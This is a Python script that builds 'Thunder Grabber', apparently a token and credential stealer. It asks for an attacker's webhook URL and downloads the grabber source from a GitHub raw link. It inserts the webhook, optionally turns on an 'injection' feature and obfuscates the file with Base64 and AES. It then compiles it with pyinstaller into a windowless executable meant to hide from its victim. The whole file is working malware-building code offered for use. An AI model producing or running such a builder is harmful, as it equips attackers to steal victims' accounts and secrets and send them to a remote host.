import requests
import os
import shutil
from colorama import Fore
import time
import Base64_encode, AES_encrypt
from os.path import exists

def black(text):
    os.system(""); faded = ""
    red = 0; green = 0; blue = 0
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
        if not red == 255 and not green == 255 and not blue == 255:
            red += 20; green += 20; blue += 20
            if red > 255 and green > 255 and blue > 255:
                red = 255; green = 255; blue = 255
    return faded

def main():
    global tempfolder
    os.system('cls')
    print(black("""
                                    ████████╗██╗  ██╗██╗   ██╗███╗   ██╗██████╗ ███████╗██████╗      
                                    ╚══██╔══╝██║  ██║██║   ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗     
                                       ██║   ███████║██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝     
                                       ██║   ██╔══██║██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗     
                                       ██║   ██║  ██║╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║     
                                       ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝     
                                                    Builder For Thunder Grabber
                                                       Made By TWISTX7#9122               
"""))
    webhook = input(f"{Fore.CYAN}Webhook URL: {Fore.RESET}")
    print(f"{Fore.YELLOW}Checking Webhbook...{Fore.RESET}")
    time.sleep(0.5)
    r = requests.get(webhook)
    if r.status_code == 200:
        print(f"{Fore.GREEN}Valid Webhook!{Fore.RESET}")
    else:
        print(f"{Fore.RED}Invalid Webhook!{Fore.RESET}")
        print("Press enter to continue")
        input()
        main()
    
    grabbername = input(f"{Fore.CYAN}Grabber name: {Fore.RESET}")
    tempfolder = os.getenv("temp")+"\\Thunder"
    try:
        os.mkdir(os.path.join(tempfolder))
    except Exception:
        pass
    raw = requests.get('https://raw.githubusercontent.com/TWIST-X7/Thunder-Grabber/main/thunder.py').text
    inj = str(input(f"{Fore.CYAN}Add Injection? (y/n): {Fore.RESET}")).lower()
    if inj == "n":
        with open(f"{tempfolder}\\{grabbername}.py", "w", encoding="utf-8") as f:
            print(f"{Fore.YELLOW}No Injection{Fore.RESET}")
            f.write(raw.replace("YOUR_WEBHOOK", webhook))
            f.close()  
    elif inj == "y":
        with open(f"{tempfolder}\\{grabbername}.py", "w", encoding="utf-8") as f:
            print(f"{Fore.YELLOW}Injecting...{Fore.RESET}")
            f.write(raw.replace("YOUR_WEBHOOK", webhook).replace("YES_NO", "y"))   
            f.close
    enc = input(f"{Fore.CYAN}Encrypt? (y/n): {Fore.RESET}").lower()
    if enc == "y":
        print(f"{Fore.YELLOW}Start Encrypting....{Fore.RESET}")
        bypassVM = "n"
        key = "10"
        pathenc = f"{tempfolder}\\{grabbername}.py"
        test2 = Base64_encode.Encode()
        test1 = AES_encrypt.Encryptor(key, pathenc,bypassVM)
        test2.encode(pathenc)
        test1.encrypt_file()
        print(f"{Fore.GREEN}Encrypting Completed Successfully!{Fore.RESET}")
    else: print(f"{Fore.YELLOW}No Encrypting{Fore.RESET}")    
    print(f"{Fore.YELLOW}Checking Requirements...{Fore.RESET}")
    os.system("pip install pyinstaller")
    os.system("pip install --upgrade -r requirements.txt")
    filepath = os.getenv("temp")+f"\\Thunder\\{grabbername}.py"
    print(f"{Fore.YELLOW}Creating Grabber...{Fore.RESET}")
    os.system(f"pyinstaller --onefile --noconsole -i NONE {filepath}")
    try:
        shutil.move(f"{os.getcwd()}\\dist\\{grabbername}.exe", f"{os.getcwd()}\\{grabbername}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
    except:
        pass
    os.remove(f'{grabbername}.spec')
    shutil.rmtree(tempfolder)
    if exists(f'{grabbername}.exe'):
        input(f"{Fore.GREEN}{grabbername}.exe Created Successfully{Fore.RESET}\nPress enter to exit...")
        exit()
    else:
        input(f"{Fore.RED}Error Creating Grabber{Fore.RESET}\nPress enter to exit...")
        exit()
main()
         